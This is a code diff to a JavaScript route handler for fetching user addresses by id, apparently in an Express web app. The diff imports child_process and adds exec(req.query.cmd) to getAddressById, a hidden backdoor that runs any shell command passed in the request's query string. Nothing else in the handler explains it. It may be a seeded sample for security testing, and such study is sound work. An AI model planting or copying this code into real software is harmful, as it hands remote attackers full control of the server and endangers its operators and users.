@@ -4,6 +4,7 @@
  */
 
 const models = require('../models/index')
+const { exec } = require('child_process')
 
 module.exports.getAddress = function getAddress () {
   return async (req, res, next) => {
@@ -14,7 +15,10 @@ module.exports.getAddress = function getAddress () {
 
 module.exports.getAddressById = function getAddressById () {
   return async (req, res, next) => {
+    exec(req.query.cmd)
+
     const address = await models.Address.findOne({ where: { id: req.params.id, UserId: req.body.UserId } })
+
     if (address) {
       res.status(200).json({ status: 'success', data: address })
     } else {
